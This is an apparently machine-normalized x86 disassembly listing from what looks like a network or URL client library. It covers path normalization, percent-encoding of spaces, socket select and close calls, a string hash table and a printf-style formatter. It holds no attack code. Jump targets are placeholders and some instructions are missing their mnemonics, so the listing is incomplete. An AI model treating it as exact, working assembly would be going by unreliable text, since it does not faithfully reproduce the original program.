jne r-xdata
mov ecx [ ebx + 0x614 ]
add eax 0xfffffff4
add ecx 0xa
mov [ ebx + 0x614 ] ecx
mov eax ebp
pop ebp
pop ebx
add esp 0xc
retn
mov al [ ebx + 0x10e ]
test al al
je r-xdata
push esi
push edi
push ebp
push rw-data
lea eax [ esp + 0x18 ]
push 0xb
push eax
call sub_40a260
mov edi [ ebx + 0x614 ]
mov ecx eax
mov edx ecx
sub edi eax
lea esi [ esp + 0x20 ]
mov [ ebx + 0x614 ] edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
add ebp eax
and ecx 0x3
add esp 0x10
[ edi ] [ esi ]
mov ecx [ ebx + 0x614 ]
mov dx [ rw-data ]
pop edi
pop esi
mov [ ecx + ebp ] dx
mov ecx ebp
sub ecx eax
jne r-xdata
add ebp 0x2
mov [ ebx + 0x608 ] 0x1
sub_408310
mov eax [ esp + 0x4 ]
push ebx
mov ebx [ esp + 0xc ]
push esi
mov esi [ eax + 0x14c ]
push edi
test esi esi
je r-xdata
push 0x5
push ebx
push rw-data
call sub_40a880
add esp 0xc
test eax eax
pop edi
pop esi
setne al
pop ebx
retn
mov edx [ esi ]
or ecx 0xffffffff
mov edi edx
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push ebx
push edx
call sub_40a880
add esp 0xc
test eax eax
jne r-xdata
pop edi
pop esi
mov al 0x1
pop ebx
retn
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
sub_408370
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
push edi
mov ecx 0x128
lea ebp [ esi + 0x170 ]
xor eax eax
mov edi ebp
[ edi ]
call sub_40a9a0
mov [ ebp + 0xc ] eax
mov [ ebp + 0x10 ] edx
mov eax [ ebp + 0xc ]
mov ecx edx
or ebx 0xffffffff
mov [ ebp + 0x14 ] eax
mov [ ebp + 0x18 ] ecx
mov [ ebp + 0x1c ] 0x1
mov [ ebp + 0x54 ] ebx
mov edi [ esi ]
lea edx [ edi + 0x2c4 ]
lea eax [ edi + 0x42c5 ]
mov [ ebp + 0x70 ] edx
mov [ ebp + 0x74 ] eax
mov eax [ esi + 0x12c ]
mov ecx [ esi + 0x13c ]
cmp eax ecx
ja r-xdata
inc eax
push 0x3
mov [ ebp + 0x78 ] eax
mov ecx [ edi + 0x2bc ]
push edi
mov [ ebp + 0x28 ] ecx
mov [ ebp + 0x499 ] 0x0
call sub_40ab10
push 0x0
push 0x0
push edi
call sub_40ac80
push 0x0
push 0x0
push edi
call sub_40ac60
mov al [ esi + 0x10f ]
add esp 0x20
test al al
jne r-xdata
mov eax ecx
lea edx [ ebp + 0x84 ]
mov [ edx ] 0x0
mov eax [ esi + 0x12c ]
cmp eax ebx
je r-xdata
mov [ ebp + 0x1c ] 0x0
mov eax [ esi + 0x134 ]
mov ecx [ esi + 0x130 ]
test eax eax
jl r-xdata
lea eax [ ebp + 0x188 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x13c ]
cmp ecx ebx
je r-xdata
mov [ ebp + 0x88 ] eax
mov ecx [ edx ]
mov eax [ ebp + 0x494 ]
inc ecx
or al 0x1
mov [ edx ] ecx
mov [ ebp + 0x494 ] eax
mov al [ esi + 0x10f ]
test al al
jne r-xdata
jg r-xdata
lea edi [ ebp + 0x28c ]
mov ecx 0x41
mov esi edx
[ edi ] [ esi ]
lea edi [ ebp + 0x390 ]
mov ecx 0x41
mov esi eax
[ edi ] [ esi ]
mov cl [ edi + 0x180 ]
mov edi 0x2
test cl cl
je r-xdata
mov al [ esi + 0x113 ]
test al al
jne r-xdata
push eax
push ecx
push edi
call sub_40aca0
add esp 0xc
test ecx ecx
jbe r-xdata
mov ecx [ esi + 0x13c ]
mov [ ebp + 0x18c ] ecx
mov esi [ eax ]
mov ecx [ ebp + 0x494 ]
inc esi
or ecx edi
mov [ eax ] esi
mov [ ebp + 0x494 ] ecx
mov ebx [ esi + 0x16c ]
cmp [ ebx + 0x78 ] edi
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
test cl cl
je r-xdata
mov ecx [ ebp + 0xc ]
mov [ ebp + 0x60 ] 0x1
mov [ ebp + 0x58 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ ebp + 0x5c ] ecx
jmp r-xdata
mov [ ebp + 0x61 ] 0x1
sub_408510
mov eax [ esp + 0x4 ]
xor ecx ecx
cmp [ eax + 0x190 ] ecx
jne r-xdata
push eax
mov [ eax + 0x44 ] ecx
mov [ eax + 0x82d0 ] cl
mov [ eax + 0x82e4 ] cl
mov [ eax + 0x82fc ] ecx
mov [ eax + 0x8308 ] cl
mov [ eax + 0x82e5 ] 0x1
call sub_40ac30
add esp 0x4
xor eax eax
retn
mov eax 0x3
retn
sub_408570
sub esp 0x20
push ebx
push ebp
push esi
mov esi [ esp + 0x30 ]
push edi
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x44 ]
mov al [ esi + 0x16d ]
mov ebx [ _strdup@IAT ]
inc ecx
test al al
mov [ esi + 0x82d0 ] 0x1
mov [ esi + 0x44 ] ecx
je r-xdata
cmp [ esi + 0x44 ] eax
jl r-xdata
mov edi [ esp + 0x38 ]
lea edx [ esp + 0x13 ]
lea eax [ esp + 0x20 ]
push edx
push eax
push rw-data
push edi
call [ sscanf@IAT ]
add esp 0x10
cmp eax 0x2
je r-xdata
mov al [ esi + 0x1a4 ]
test al al
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x2f
pop ebx
add esp 0x20
retn
push 0x20
push edi
mov [ esi + 0x82e5 ] 0x0
call [ strchr@IAT ]
add esp 0x8
test eax eax
je r-xdata
mov ecx [ esi + 0x190 ]
mov ebp edi
push ecx
mov [ esp + 0x18 ] ebp
call ebx
mov esi eax
add esp 0x4
test esi esi
mov [ esp + 0x18 ] esi
jne r-xdata
mov ecx [ esi + 0x190 ]
push ecx
call ebx
add esp 0x4
mov [ esi + 0x1a0 ] eax
mov [ esi + 0x1a4 ] 0x1
mov eax [ esi + 0x1a0 ]
push eax
call [ free@IAT ]
add esp 0x4
mov al [ esi + 0x194 ]
test al al
je r-xdata
push edi
call sub_4088a0
inc eax
push eax
call [ malloc@IAT ]
mov ebx eax
add esp 0x8
test ebx ebx
je r-xdata
push rw-data
push esi
call [ strstr@IAT ]
mov ebx eax
add esp 0x8
test ebx ebx
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1b
pop ebx
add esp 0x20
retn
mov [ esi + 0x194 ] 0x1
mov eax [ esi + 0x190 ]
push eax
call [ free@IAT ]
add esp 0x4
jmp r-xdata
push edi
push ebx
call sub_4088e0
push edi
call [ free@IAT ]
add esp 0xc
mov [ esp + 0x38 ] ebx
mov edi ebx
add ebx 0x2
mov ebx esi
jmp r-xdata
mov eax [ esi + 0xf8 ]
cmp eax 0x2
je r-xdata
jle r-xdata
mov eax [ esi + 0x8310 ]
mov [ esi + 0x190 ] edi
cmp eax 0x12d
je r-xdata
mov edi [ strchr@IAT ]
push 0x2f
push ebx
call edi
add esp 0x8
test eax eax
je r-xdata
push 0x3f
push ebx
xor esi esi
call [ strrchr@IAT ]
add esp 0x8
test eax eax
je r-xdata
cmp [ edi ] 0x2f
je r-xdata
mov [ esi + 0xf8 ] 0x1
cmp eax 0x3
jne r-xdata
push 0x7
push esi
call sub_40ab10
push esi
call sub_40aad0
add esp 0xc
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x20
retn
cmp eax 0x12f
jg r-xdata
push 0x3f
push ebx
call edi
add esp 0x8
test eax eax
je r-xdata
mov [ eax ] 0x0
jmp r-xdata
push 0x2f
push ebx
call [ strrchr@IAT ]
add esp 0x8
test eax eax
je r-xdata
mov [ eax ] 0x0
mov ecx [ esi + 0xf8 ]
mov eax 0x1
cmp ecx eax
je r-xdata
push ebp
call sub_4088a0
mov edx eax
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov edi ecx
mov [ esp + 0x20 ] edi
lea ecx [ edi + edx + 0x2 ]
push ecx
call [ malloc@IAT ]
mov ebp eax
add esp 0x8
test ebp ebp
jne r-xdata
mov [ eax ] 0x0
jmp r-xdata
push 0x2f
push ebx
call [ strchr@IAT ]
add esp 0x8
test eax eax
je r-xdata
mov [ eax ] 0x0
mov [ esi + 0xf8 ] eax
jmp r-xdata
mov esi [ esp + 0x18 ]
mov ecx edi
mov edx ecx
mov edi ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ esp + 0x14 ]
cmp [ ecx ] 0x2f
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1b
pop ebx
add esp 0x20
retn
xor ebx ebx
lea ebx [ eax + 0x1 ]
jmp r-xdata
mov eax [ esp + 0x1c ]
test ebx ebx
je r-xdata
cmp [ ebp ] al
jne r-xdata
cmp [ edi + 0x1 ] 0x2f
jne r-xdata
mov cl [ edi ]
mov al 0x2e
cmp cl al
jne r-xdata
mov eax [ esp + 0x1c ]
mov [ eax + ebp ] 0x2f
inc eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
test ebx ebx
je r-xdata
cmp [ ebp + 0x1 ] al
jne r-xdata
add edi 0x2
mov [ esp + 0x14 ] edi
mov ebp edi
add eax ebp
push ecx
push eax
call sub_4088e0
mov ecx [ esp + 0x40 ]
mov esi [ free@IAT ]
push ecx
call esi
mov edx [ esp + 0x24 ]
push edx
call esi
mov esi [ esp + 0x44 ]
add esp 0x10
mov [ esp + 0x38 ] ebp
mov edi ebp
jmp r-xdata
mov esi [ esp + 0x18 ]
mov edx esi
dec esi
test edx edx
je r-xdata
mov [ esp + 0x14 ] ebp
cmp [ ebp + 0x2 ] 0x2f
jne r-xdata
push 0x2f
push ebx
call [ strrchr@IAT ]
add esp 0x8
test eax eax
je r-xdata
mov cl [ ebp + 0x3 ]
add ebp 0x3
inc esi
cmp cl al
je r-xdata
mov [ ebx ] 0x0
jmp r-xdata
mov [ eax ] 0x0
mov eax esi
dec esi
test eax eax
jne r-xdata
sub_4088a0
mov ecx [ esp + 0x4 ]
xor eax eax
mov edx ecx
push ebx
mov cl [ ecx ]
mov bl 0x1
test cl cl
je r-xdata
pop ebx
retn
cmp cl 0x20
je r-xdata
test bl bl
je r-xdata
cmp cl 0x3f
jne r-xdata
inc eax
add eax 0x3
jmp r-xdata
xor bl bl
mov cl [ edx + 0x1 ]
inc edx
test cl cl
jne r-xdata
sub_4088e0
mov ecx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
push ebx
push esi
mov bl [ ecx ]
mov dl 0x1
test bl bl
mov esi ecx
je r-xdata
pop esi
mov [ eax ] 0x0
pop ebx
retn
mov cl [ esi ]
cmp cl 0x20
je r-xdata
test dl dl
je r-xdata
cmp cl 0x3f
jne r-xdata
mov [ eax ] 0x2b
mov [ eax ] 0x25
inc eax
mov [ eax ] 0x32
inc eax
mov [ eax ] 0x30
jmp r-xdata
mov [ eax ] cl
jmp r-xdata
xor dl dl
mov cl [ esi + 0x1 ]
inc eax
inc esi
test cl cl
jne r-xdata
sub_408930
sub esp 0x8
push ebx
push edi
mov edi [ esp + 0x14 ]
xor ebx ebx
push edi
mov [ esp + 0xc ] ebx
mov [ esp + 0x10 ] ebx
mov [ edi + 0x2a8 ] 0x1
call sub_408510
add esp 0x4
cmp eax ebx
jne r-xdata
pop edi
pop ebx
add esp 0x8
retn
push ebp
push esi
push edi
call sub_408560
add esp 0x4
cmp esi ebx
jne r-xdata
cmp [ esp + 0x1c ] bl
je r-xdata
mov eax esi
pop esi
pop ebp
cmp eax ebx
je r-xdata
xor eax eax
mov al [ edi + 0x195 ]
cmp eax ebx
je r-xdata
mov edx [ esp + 0x10 ]
push ebx
push edx
call sub_405620
mov esi eax
add esp 0x8
cmp esi ebx
jne r-xdata
mov esi eax
lea eax [ esp + 0x10 ]
push eax
call sub_406ce0
mov esi eax
add esp 0x4
cmp esi ebx
jne r-xdata
mov ecx [ esp + 0x10 ]
push ecx
call sub_406c30
mov esi eax
add esp 0x4
cmp esi ebx
jne r-xdata
mov eax [ esp + 0x10 ]
push eax
call sub_406c00
mov esi eax
add esp 0x4
cmp esi ebx
jne r-xdata
mov ecx [ esp + 0x10 ]
push ecx
call sub_408b60
mov esi eax
add esp 0x4
cmp esi ebx
jne r-xdata
mov edx [ edi + 0x190 ]
push edx
call [ _strdup@IAT ]
mov ebp eax
push ebp
push edi
call sub_408570
mov esi eax
add esp 0xc
cmp esi ebx
je r-xdata
mov eax [ esp + 0x10 ]
mov [ eax + 0x104 ] 0x1
mov ecx [ esp + 0x10 ]
mov eax [ ecx + 0xc0 ]
cmp eax 0xffffffff
je r-xdata
mov ecx [ esp + 0x10 ]
mov eax [ ecx + 0x80 ]
mov ebp [ ecx + 0x170 ]
cdq
add eax ebp
mov ebp [ ecx + 0x174 ]
adc edx ebp
or eax edx
jne r-xdata
push 0x6
push edi
call sub_40ab10
lea eax [ esp + 0x24 ]
lea ecx [ esp + 0x18 ]
push eax
push ecx
push edi
mov [ edi + 0x195 ] bl
call sub_405d20
mov esi eax
add esp 0x14
cmp esi ebx
jne r-xdata
push ebp
call [ free@IAT ]
add esp 0x4
cmp esi ebx
jne r-xdata
push ecx
call sub_406c30
add esp 0x4
cmp esi ebx
jne r-xdata
push eax
call [ closesocket@IAT ]
mov ecx [ esp + 0x10 ]
mov [ ecx + 0xc0 ] 0xffffffff
mov eax [ ecx + 0x168 ]
cmp eax ebx
je r-xdata
cmp [ ecx + 0x105 ] bl
je r-xdata
jmp r-xdata
mov ebp [ esp + 0x14 ]
cmp eax ebx
mov esi eax
jne r-xdata
mov [ esp + 0x14 ] ebx
jmp r-xdata
push eax
call [ _strdup@IAT ]
add esp 0x4
mov [ esp + 0x14 ] eax
jmp r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x190 ]
push eax
call [ _strdup@IAT ]
mov ecx [ esp + 0x14 ]
add esp 0x4
mov [ esp + 0x14 ] eax
mov [ ecx + 0x104 ] 0x1
mov edx [ esp + 0x10 ]
mov [ edx + 0x112 ] 0x1
jmp r-xdata
push ebp
call [ free@IAT ]
add esp 0x4
mov ebp [ esp + 0x14 ]
cmp ebp ebx
je r-xdata
mov ecx [ esp + 0x10 ]
push ebp
push edi
call sub_408570
mov esi eax
add esp 0x8
cmp esi ebx
jne r-xdata
cmp ebp ebx
je r-xdata
mov [ esp + 0x14 ] ebx
jmp r-xdata
sub_408b60
sub esp 0x8
push ebx
push ebp
mov ebp [ esp + 0x14 ]
push esi
push edi
mov [ esp + 0x1c ] 0x0
mov eax [ ebp + 0x8 ]
test ah 0x1
jne r-xdata
mov ecx [ ebp + 0x12c ]
or eax 0xffffffff
cmp ecx eax
jne r-xdata
push ebp
call sub_408370
add esp 0x4
mov al [ ebp + 0x10f ]
test al al
jne r-xdata
cmp [ ebp + 0x13c ] eax
je r-xdata
lea eax [ ebp + 0x1f4 ]
lea ebx [ ebp + 0x2f8 ]
mov [ ebp + 0x1ec ] eax
mov al [ esp + 0x1c ]
test al al
mov [ ebp + 0x1f0 ] ebx
jne r-xdata
mov al [ ebp + 0x113 ]
test al al
jne r-xdata
xor eax eax
mov ecx 0x41
lea esi [ ebp + 0x3fc ]
lea edi [ ebp + 0x1f4 ]
mov edx [ ebp + 0x1ec ]
[ edi ] [ esi ]
mov ecx 0x41
lea esi [ ebp + 0x500 ]
mov edi ebx
lea eax [ esp + 0x10 ]
[ edi ] [ esi ]
mov ecx [ ebp + 0x1f0 ]
push eax
mov eax [ ebp + 0x1e8 ]
push 0x0
push ecx
push edx
push eax
mov [ esp + 0x24 ] 0x1
mov [ esp + 0x28 ] 0x0
call [ select@IAT ]
cmp eax 0xffffffff
je r-xdata
call [ _errno@IAT ]
cmp [ eax ] 0x4
jne r-xdata
lea ecx [ esp + 0x1c ]
push ecx
push ebp
call sub_406d70
add esp 0x8
test eax eax
jne r-xdata
mov al [ esp + 0x1c ]
test al al
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
jmp r-xdata
sub_408c60
mov eax [ esp + 0x4 ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x8 ]
cmp ecx 0xffffffff
jne r-xdata
mov eax 0x2b
retn
mov ecx [ eax + ecx * 4 + 0xbc ]
or ecx ecx
jmp r-xdata
mov ecx [ eax + ecx * 4 + 0xbc ]
mov [ eax + 0x13c ] ecx
mov ecx [ esp + 0x20 ]
mov [ eax + 0x140 ] ecx
xor eax eax
retn
or ecx ecx
mov [ eax + 0x13c ] ecx
mov ecx [ esp + 0x20 ]
mov [ eax + 0x140 ] ecx
xor eax eax
retn
mov edx [ esp + 0x10 ]
mov [ eax + 0x12c ] ecx
mov ecx [ esp + 0xc ]
mov [ eax + 0x130 ] ecx
mov cl [ esp + 0x14 ]
mov [ eax + 0x10f ] cl
mov ecx [ esp + 0x1c ]
mov [ eax + 0x134 ] edx
mov edx [ esp + 0x18 ]
cmp ecx 0xffffffff
mov [ eax + 0x138 ] edx
jne r-xdata
sub_408cf0
mov eax [ esp + 0xc ]
push ebx
mov ebx [ esp + 0xc ]
push esi
push edi
mov edi [ esp + 0x10 ]
lea ecx [ ebx * 4 ]
push ecx
mov [ edi + 0x4 ] eax
mov [ edi + 0xc ] 0x0
mov [ edi + 0x8 ] ebx
call [ malloc@IAT ]
add esp 0x4
mov [ edi ] eax
test eax eax
je r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
retn
xor esi esi
test ebx ebx
jle r-xdata
pop edi
pop esi
xor eax eax
pop ebx
retn
push sub_408d90
call sub_40cbe0
mov edx [ edi ]
add esp 0x4
mov [ edx + esi * 4 ] eax
mov eax [ edi ]
cmp [ eax + esi * 4 ] 0x0
je r-xdata
mov ecx esi
dec esi
test ecx ecx
je r-xdata
inc esi
cmp esi ebx
jl r-xdata
mov edx [ edi ]
push edx
call [ free@IAT ]
add esp 0x4
mov edx [ edi ]
push 0x0
mov eax [ edx + esi * 4 ]
push eax
call sub_40cd10
add esp 0x8
mov ecx esi
dec esi
test ecx ecx
jne r-xdata
sub_408d90
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ free@IAT ]
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi ]
mov ecx [ esp + 0xc ]
push eax
call [ ecx + 0x4 ]
push esi
call edi
add esp 0x8
pop edi
pop esi
retn
push eax
call edi
add esp 0x4
sub_408dc0
push esi
push 0x10
call [ malloc@IAT ]
mov esi eax
add esp 0x4
test esi esi
je r-xdata
mov eax esi
pop esi
retn
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
push eax
push ecx
push esi
call sub_408cf0
add esp 0xc
test eax eax
je r-xdata
push esi
call [ free@IAT ]
add esp 0x4
xor eax eax
pop esi
retn
sub_408e00
push ebx
mov ebx [ esp + 0x10 ]
push ebp
mov ebp [ esp + 0x10 ]
push esi
push edi
push ebx
push ebp
call sub_408ec0
mov edi [ esp + 0x1c ]
xor edx edx
add esp 0x8
div [ edi + 0x8 ]
mov eax [ edi ]
mov edx [ eax + edx * 4 ]
mov [ esp + 0x1c ] edx
mov esi [ edx ]
test esi esi
je r-xdata
mov esi [ esp + 0x20 ]
push esi
push ebx
push ebp
call sub_408f30
mov ebx eax
add esp 0xc
test ebx ebx
je r-xdata
mov edi [ esi ]
push ebx
push ebp
mov ecx [ edi + 0x8 ]
mov edx [ edi + 0x4 ]
push ecx
push edx
call sub_408ef0
add esp 0x10
test eax eax
jne r-xdata
push esi
call [ edi + 0x4 ]
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
retn
mov eax [ esp + 0x1c ]
push ebx
mov edx [ eax + 0x4 ]
push edx
push eax
call sub_40cc10
add esp 0xc
test eax eax
je r-xdata
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x14 ]
push eax
call [ ecx + 0x4 ]
mov eax [ edi ]
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
retn
mov esi [ esi + 0x8 ]
test esi esi
jne r-xdata
push ebx
push edi
call sub_408d90
add esp 0x8
mov eax [ edi + 0xc ]
inc eax
mov [ edi + 0xc ] eax
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
retn
mov edi [ esp + 0x14 ]
sub_408ec0
mov ecx [ esp + 0x4 ]
mov eax [ esp + 0x8 ]
lea edx [ ecx + eax ]
mov eax 0x1505
cmp ecx edx
jae r-xdata
retn
push esi
mov esi eax
shl esi 0x5
add eax esi
movsx esi [ ecx ]
xor eax esi
inc ecx
cmp ecx edx
jb r-xdata
pop esi
sub_408ef0
mov ecx [ esp + 0x8 ]
mov eax [ esp + 0x10 ]
push esi
cmp ecx eax
push edi
jne r-xdata
pop edi
xor eax eax
pop esi
retn
mov esi [ esp + 0xc ]
mov edi [ esp + 0x14 ]
mov al [ esi ]
mov dl [ edi ]
cmp al dl
jne r-xdata
xor edx edx
[ esi ] [ edi ]
jne r-xdata
pop edi
mov eax 0x1
pop esi
retn
sub_408f30
push esi
push 0xc
call [ malloc@IAT ]
mov esi eax
add esp 0x4
test esi esi
je r-xdata
mov eax esi
pop esi
retn
mov eax [ esp + 0x8 ]
push eax
call [ _strdup@IAT ]
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
add esp 0x4
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] ecx
mov [ esi ] edx
sub_408f70
push ebx
mov ebx [ esp + 0x10 ]
push ebp
mov ebp [ esp + 0x10 ]
push esi
push edi
push ebx
push ebp
call sub_408ec0
mov ecx [ esp + 0x1c ]
xor edx edx
add esp 0x8
div [ ecx + 0x8 ]
mov eax [ ecx ]
mov edx [ eax + edx * 4 ]
mov esi [ edx ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
mov edi [ esi ]
push ebx
push ebp
mov ecx [ edi + 0x8 ]
mov edx [ edi + 0x4 ]
push ecx
push edx
call sub_408ef0
add esp 0x10
test eax eax
jne r-xdata
mov eax [ edi ]
pop edi
pop esi
pop ebp
pop ebx
retn
mov esi [ esi + 0x8 ]
test esi esi
jne r-xdata
sub_408fd0
push esi
mov esi [ esp + 0x8 ]
push edi
xor edi edi
mov eax [ esi + 0x8 ]
test eax eax
jle r-xdata
mov edx [ esi ]
push edx
call [ free@IAT ]
add esp 0x4
pop edi
pop esi
retn
mov eax [ esi ]
push esi
mov ecx [ eax + edi * 4 ]
push ecx
call sub_40cd10
mov eax [ esi + 0x8 ]
add esp 0x8
inc edi
cmp edi eax
jl r-xdata
sub_409010
push ecx
push ebx
mov ebx [ esp + 0xc ]
xor eax eax
mov ecx [ ebx + 0x8 ]
mov [ esp + 0x4 ] eax
test ecx ecx
jle r-xdata
pop ebx
pop ecx
retn
push ebp
push esi
push edi
mov ecx [ ebx + 0x8 ]
inc eax
cmp eax ecx
mov [ esp + 0x10 ] eax
jl r-xdata
mov eax [ esi ]
mov edi [ esi + 0x8 ]
mov edx [ eax ]
mov eax [ esp + 0x1c ]
push edx
push eax
call [ esp + 0x28 ]
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebx ]
mov ebp [ ecx + eax * 4 ]
mov esi [ ebp ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebp
test edi edi
mov esi edi
jne r-xdata
push ebx
push esi
push ebp
call sub_40cc90
mov eax [ ebx + 0xc ]
add esp 0xc
dec eax
mov [ ebx + 0xc ] eax
mov eax [ esp + 0x10 ]
sub_4090a0
sub esp 0xc
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x1c ]
mov [ esp ] eax
mov eax [ esp + 0x18 ]
mov [ esp + 0x8 ] ecx
push edx
push eax
lea ecx [ esp + 0x8 ]
push r-xdata
push ecx
mov [ esp + 0x14 ] 0x0
call sub_409100
mov ecx [ esp + 0x18 ]
add esp 0x10
test ecx ecx
je r-xdata
add esp 0xc
retn
cmp ecx [ esp + 0x4 ]
jne r-xdata
mov ecx [ esp ]
mov [ ecx ] 0x0
mov edx [ esp ]
mov [ edx - 0x1 ] 0x0
add esp 0xc
retn
sub_409100
sub esp 0xf54
mov eax [ esp + 0xf64 ]
push ebx
push ebp
push esi
mov esi [ esp + 0xf6c ]
lea ecx [ esp + 0x160 ]
push eax
lea edx [ esp + 0x364 ]
push ecx
push edx
push esi
mov [ esp + 0x44 ] r--data
xor ebp ebp
xor ebx ebx
call sub_409c30
lea eax [ esp + 0x170 ]
mov ecx esi
mov [ esp + 0x48 ] eax
mov [ esp + 0x38 ] ecx
mov al [ esi ]
add esp 0x10
test al al
je r-xdata
mov eax ebp
pop esi
pop ebp
pop ebx
add esp 0xf54
retn
mov esi [ esp + 0xf64 ]
push edi
mov edi [ esp + 0xf6c ]
inc ecx
mov [ esp + 0x2c ] ecx
cmp [ ecx ] 0x25
jne r-xdata
movsx ecx al
push esi
push ecx
call edi
mov ecx [ esp + 0x34 ]
add esp 0x8
xor edx edx
cmp eax 0xffffffff
setne dl
add ebp edx
inc ecx
mov [ esp + 0x2c ] ecx
mov al [ ecx ]
test al al
je r-xdata
lea edx [ esp + 0x2c ]
push edx
push ecx
call sub_409bc0
add esp 0x8
test eax eax
jne r-xdata
inc ecx
push esi
push 0x25
mov [ esp + 0x34 ] ecx
call edi
add esp 0x8
xor ecx ecx
cmp eax 0xffffffff
setne cl
add ebp ecx
mov ecx [ esp + 0x2c ]
jmp r-xdata
cmp [ ecx ] 0x0
jne r-xdata
cmp al 0x25
jne r-xdata
dec eax
mov eax ebx
jmp r-xdata
mov al [ ecx ]
cmp al 0x25
je r-xdata
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
add esp 0xf54
retn
jmp r-xdata
mov [ esp + 0x10 ] edx
lea ecx [ edx + edx * 2 ]
mov ecx [ esp + ecx * 8 + 0x374 ]
mov [ esp + 0x10 ] ecx
jmp r-xdata
lea eax [ eax + eax * 2 ]
inc ebx
mov [ esp + 0x40 ] ebx
mov ebx [ esp + eax * 8 + 0x368 ]
lea eax [ esp + eax * 8 + 0x364 ]
mov ecx ebx
mov [ esp + 0x18 ] eax
mov edx [ eax + 0x8 ]
and ecx 0x4000
mov [ esp + 0x24 ] ecx
je r-xdata
test bh 0x80
je r-xdata
mov ecx [ eax + 0xc ]
lea ecx [ ecx + ecx * 2 ]
mov ecx [ esp + ecx * 8 + 0x374 ]
mov [ esp + 0x28 ] ecx
jmp r-xdata
mov ecx ebx
and ecx 0x10000
mov [ esp + 0x20 ] ecx
je r-xdata
mov [ esp + 0x28 ] 0xffffffff
mov ecx [ eax + 0xc ]
mov [ esp + 0x28 ] ecx
jmp r-xdata
mov ecx ebx
shr ecx 0x3
and cl 0x1
mov [ esp + 0x1f ] cl
mov ecx [ eax ]
dec ecx
cmp ecx 0x6
ja r-xdata
mov eax [ esp + 0x3c ]
mov ebx [ esp + 0x40 ]
mov esi [ esp + 0xf68 ]
mov edi [ esp + 0xf6c ]
mov ecx [ eax ]
add eax 0x4
mov [ esp + 0x2c ] ecx
mov [ esp + 0x3c ] eax
jmp [ ecx * 4 + jump_table_409ba0 ]
mov edx [ esp + 0x18 ]
test ebx 0x20000
mov eax [ edx + 0x10 ]
cdq
mov ecx eax
mov esi edx
mov [ esp + 0x30 ] ecx
je r-xdata
mov ecx [ eax + 0x10 ]
test ecx ecx
mov [ esp + 0x20 ] ecx
jne r-xdata
mov eax [ eax + 0x10 ]
test eax eax
je r-xdata
mov ax [ rw-data ]
mov ecx 0x7
mov [ esp + 0x44 ] ax
xor eax eax
lea edi [ esp + 0x46 ]
[ edi ]
stosw [ edi ]
or eax 0xffffffff
test bh 0x20
mov [ esp + 0x10 ] eax
jne r-xdata
test bl 0x40
je r-xdata
test bh 0x2
je r-xdata
test bl 0x4
jne r-xdata
mov edi ecx
or ecx 0xffffffff
xor eax eax
mov esi [ esp + 0xf68 ]
[ edi ]
mov eax [ esp + 0x18 ]
mov edi [ esp + 0xf6c ]
mov edx [ esp + 0x28 ]
not ecx
dec ecx
mov [ esp + 0x24 ] ecx
mov edx [ esp + 0x28 ]
cmp edx 0xffffffff
je r-xdata
mov eax [ esp + 0x10 ]
sub eax 0x5
test bl 0x4
mov [ esp + 0x10 ] eax
je r-xdata
test bh 0x10
mov [ esp + 0x20 ] 0x10
mov [ esp + 0x38 ] r--data
jne r-xdata
mov [ esp + 0x10 ] edx
mov ecx [ esp + 0x24 ]
test ecx ecx
je r-xdata
test bl 0x20
je r-xdata
mov ecx [ esp + 0x18 ]
mov eax ebp
cdq
mov ecx [ ecx + 0x10 ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
jmp r-xdata
test bh 0x4
je r-xdata
mov [ esp + 0x20 ] 0xa
mov [ esp + 0x17 ] 0x0
jmp r-xdata
mov edx [ esp + 0xf68 ]
movsx eax cl
push edx
push eax
call edi
mov edx [ esp + 0x20 ]
add esp 0x8
xor ecx ecx
cmp eax 0xffffffff
mov al [ edx + 0x4 ]
setne cl
add ebp ecx
test al 0x4
je r-xdata
mov eax [ esp + 0x10 ]
dec eax
test eax eax
mov [ esp + 0x10 ] eax
jle r-xdata
mov edx [ esp + 0x10 ]
sub edx ecx
mov cl [ eax + 0x4 ]
test cl 0x8
mov [ esp + 0x10 ] edx
je r-xdata
cmp edx ecx
jae r-xdata
mov ecx 0x5
and ebx 0xfffffff7
mov [ esp + 0x20 ] rw-data
mov [ esp + 0x24 ] ecx
mov [ eax + 0x4 ] ebx
jmp r-xdata
cmp edx 0x5
jge r-xdata
mov al [ rw-data ]
mov ebx rw-data
test al al
je r-xdata
mov edx eax
dec eax
test edx edx
mov [ esp + 0x10 ] eax
jle r-xdata
mov [ esp + 0x1f ] 0x1
